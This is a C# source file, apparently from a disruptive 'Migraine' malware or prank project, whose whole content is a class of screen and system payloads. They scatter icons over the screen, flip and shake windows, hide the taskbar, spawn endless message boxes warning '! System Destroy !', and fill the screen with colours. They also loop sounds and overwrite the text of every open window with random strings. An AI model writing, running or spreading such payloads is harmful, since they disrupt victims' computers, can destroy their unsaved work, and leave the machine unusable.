using System.Threading;
using System;
using System.Windows.Forms;
using System.Drawing;
using System.Text;
using System.Media;
using System.Collections.Generic;
using Library;

namespace Migraine
{
    class Payloads
    {
        #region Payloads

        #region IconScatter

        public static void IconScatter()
        {
            IntPtr HDC = lib.GetDC(IntPtr.Zero);
            Graphics image1 = Graphics.FromHdc(HDC);
            Image Resource;

            Random random = new Random();
            float x1 = 0;
            float y1 = 0;
            float y2 = 0;
            float eF = 40;

            var icons = new List<Icon> { SystemIcons.Error, SystemIcons.Warning, SystemIcons.Information, SystemIcons.Shield, SystemIcons.Application };

            while (true)
            {
                for (float x = 0; x < 60; x += 0.1F)
                {
                    Resource = icons[random.Next(icons.Count)].ToBitmap();
                    float yEx = random.Next(0, Screen.PrimaryScreen.Bounds.Height);

                    y2 = (float)Math.Sin(x);

                    image1.DrawImage(Resource, x1 * eF, y1 * eF + yEx, 32, 32);

                    x1 = x;
                    y1 = y2;
                }
            }
        }

        #endregion

        #region IconDraw

        public static void IconDraw()
        {
            IntPtr HDC = lib.GetDC(IntPtr.Zero);
            Graphics image1 = Graphics.FromHdc(HDC);
            Image Resource;

            Random random = new Random();

            var icons = new List<Icon> { SystemIcons.Error, SystemIcons.Warning, SystemIcons.Information, SystemIcons.Shield, SystemIcons.Application };

            while (true)
            {
                Resource = icons[random.Next(icons.Count)].ToBitmap();
                image1.DrawImage(Resource, Cursor.Position.X - 20, Cursor.Position.Y - 20);
                Thread.Sleep(10);
            }
        }

        #endregion

        #region FlipWindowContents

        public static void FlipWindowContents()
        {
            while (variables.fwcRunning)
            {
                lib._FlipLeft();
                Thread.Sleep(3000);
                lib._FlipRight();
                Thread.Sleep(3000);
            }
        }

        #endregion

        #region ArabicTaskbar

        public static void ArabicTaskbar()
        {
            while (true)
            {
                IntPtr hwnd = lib.FindWindowEx(lib.GetDesktopWindow(), 0, "Shell_traywnd", 0);
                lib.FlipLeft(hwnd);
                Thread.Sleep(3000);
                lib.FlipRight(hwnd);
                Thread.Sleep(3000);
            }
        }

        #endregion

        #region ShakeWindows

        public static void ShakeWindows()
        {
            while (variables.swRunning)
            {
                IntPtr hWnd = lib.GetForegroundWindow();
                Random _random = new Random();
                int currentX = lib.GetLocation(hWnd).X;
                int currentY = lib.GetLocation(hWnd).Y;
                int x = _random.Next(currentX - 5, currentX + 5 + 1);
                int y = _random.Next(currentY - 5, currentY + 5 + 1);
                lib.SetWindowPos(hWnd, 0, x, y, 0, 0, 0x0001);
                Thread.Sleep(10);
            }
        }

        #endregion

        #region HideTaskbar

        public static void HideTaskbar()
        {
            IntPtr hwnd1 = lib.GetDesktopWindow();
            IntPtr hwnd2 = lib.FindWindowEx(hwnd1, 0, "Shell_traywnd", 0);
            lib.SetWindowPos(hwnd2, 0, 0, 0, 0, 0, 0x80);
        }

        #endregion

        #region MessageBox

        public static void MB_THREAD()
        {
            Random random = new Random();
            var buttons = new List<MessageBoxButtons> { MessageBoxButtons.OK, MessageBoxButtons.YesNo, MessageBoxButtons.AbortRetryIgnore, MessageBoxButtons.OKCancel, MessageBoxButtons.RetryCancel, MessageBoxButtons.YesNoCancel };
            var icons = new List<MessageBoxIcon> { MessageBoxIcon.Asterisk, MessageBoxIcon.Error, MessageBoxIcon.Exclamation, MessageBoxIcon.Hand, MessageBoxIcon.Information, MessageBoxIcon.None, MessageBoxIcon.Question, MessageBoxIcon.Stop, MessageBoxIcon.Warning };
            var messages = new List<string> { " ", "Warning", "! System Destroy !" };

            MessageBox.Show(messages[random.Next(messages.Count)], "Migraine", buttons[random.Next(buttons.Count)], icons[random.Next(icons.Count)]);
        }

        public static void MessageBoxes()
        {
            while (variables.mbRunning)
            {
                new Thread(new ThreadStart(MB_THREAD)).Start();
                Random _random = new Random();
                int sv = _random.Next(1000, 5000);
                Thread.Sleep(sv);
            }
        }

        #endregion

        #region DrawColors

        public static void DrawColors()
        {
            while (variables.dcRunning)
            {
                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                Random _random = new Random();
                using (Graphics g = Graphics.FromHdc(lib.GetDC(IntPtr.Zero)))
                {
                    Color mycolor = Color.FromArgb(255, _random.Next(256), _random.Next(256), _random.Next(256));
                    SolidBrush brush = new SolidBrush(mycolor);
                    g.FillRectangle(brush, new Rectangle(0, 0, x, y));
                }
                int sv = _random.Next(3000, 10000);
                Thread.Sleep(sv);
            }
        }

        #endregion

        #region SetAllText

        public static void SetAllText()
        {
            while (variables.stRunning)
            {
                lib.EnumChildWindows(lib.GetDesktopWindow(), EnumChildProc, IntPtr.Zero);
                Thread.Sleep(10);
            }
        }

        public static bool EnumChildProc(IntPtr hwnd, IntPtr lParam)
        {
            StringBuilder sb = new StringBuilder(strings.RandomString(10));

            lib.SendMessageTimeoutText(hwnd, 0x000C, 0, sb, 0x2, 100, out hwnd);

            return true;
        }

        #endregion

        #region RandomSounds

        public static void RandomSounds()
        {
            Random random = new Random();
            while (true)
            {
                int x = random.Next(0, 100);

                if (x <= 50)
                {
                    SystemSounds.Hand.Play();
                }
                else if (x >= 50)
                {
                    SystemSounds.Beep.Play();
                }

                Thread.Sleep(1000);
            }
        }

        #endregion

        #region WindowBounce

        public static void WindowBounce()
        {
            Point Location = new Point();
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            bool LocXStat = true;
            bool LocYStat = true;
            int div = 5;
            while (true)
            {
                IntPtr hWnd = lib.GetForegroundWindow();
                Rectangle rect = lib.getrect(hWnd);
                if (LocXStat)
                {
                    if (Location.X >= x - (rect.Width / div))
                        LocXStat = false;
                    Location.X += (rect.Width / div) / 2;
                }
                else
                {
                    if (Location.X <= 0)
                        LocXStat = true;
                    Location.X -= (rect.Width / div) / 2;
                }
                if (LocYStat)
                {
                    if (Location.Y >= y - (rect.Height / div))
                        LocYStat = false;
                    Location.Y += (rect.Height / div) / 2;
                }
                else
                {
                    if (Location.Y <= 0)
                        LocYStat = true;
                    Location.Y -= (rect.Height / div) / 2;
                }
                lib.SetWindowPos(hWnd, 0, Location.X, Location.Y, 0, 0, 0x001);
                Thread.Sleep(10);
            }
        }

        #endregion

        #region Bounce

        public static void Bounce()
        {
            Point Location = new Point();
            int y = Screen.PrimaryScreen.Bounds.Height;
            bool LocYStat = true;
            int div = 1;
            while (true)
            {
                IntPtr hWnd = lib.GetForegroundWindow();
                Rectangle rect = lib.getrect(hWnd);
                if (LocYStat)
                {
                    if (Location.Y >= y - (rect.Height - div) / 300)
                        LocYStat = false;
                    Location.Y += (rect.Height - div) / 300;
                }
                else
                {
                    if (Location.Y <= 0)
                        LocYStat = true;
                    Location.Y -= (rect.Height - div) / 300;
                }
                lib.SetWindowPos(hWnd, 0, lib.GetLocation(hWnd).X, Location.Y, 0, 0, 0x001);
                Thread.Sleep(10);
            }
        }

        #endregion

        #region 216Music

        public static void Play216Looping()
        {
            SoundPlayer player = new SoundPlayer(Properties.Resources._216);
            while (true)
            {
                player.Play();
                Thread.Sleep(143000);
            }
        }

        #endregion

        #region RandomBeep

        public static void RandomBeep()
        {
            Random random = new Random();
            while (true)
            {
                Console.Beep(random.Next(37, 1000), 1000);
            }
        }

        #endregion

        #endregion
    }
}
